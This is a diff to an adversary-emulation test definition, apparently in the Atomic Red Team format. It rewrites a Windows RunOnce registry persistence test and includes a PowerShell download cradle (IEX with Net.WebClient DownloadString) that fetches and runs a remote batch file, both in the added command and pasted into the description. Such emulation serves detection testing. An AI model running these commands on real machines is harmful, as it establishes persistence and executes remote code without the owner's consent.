@@ -35,19 +35,15 @@ atomic_tests:
       REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
       REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
 
-- name: PowerShell Registry RunOnce
+- name: Persistence with Registry RunOnce
   description: |
-    RunOnce Key Persistence via PowerShell
+    RunOnce Key Persistence via Command Prompt. (IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/ARTifacts/Misc/Discovery.bat)
   supported_platforms:
     - windows
-  input_arguments:
-    thing_to_execute:
-      description: Thing to Run
-      type: Path
-      default: powershell.exe
+
   executor:
-    name: powershell
+    name: command_prompt
     command: |
-      $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/ARTifacts/Misc/Discovery.bat`")"'
-      Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
+      REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Thremulate" /t REG_SZ /F /D "powershell.exe 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/ARTifacts/Misc/Discovery.bat')"
+      REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /V "Thremulate" /f
+
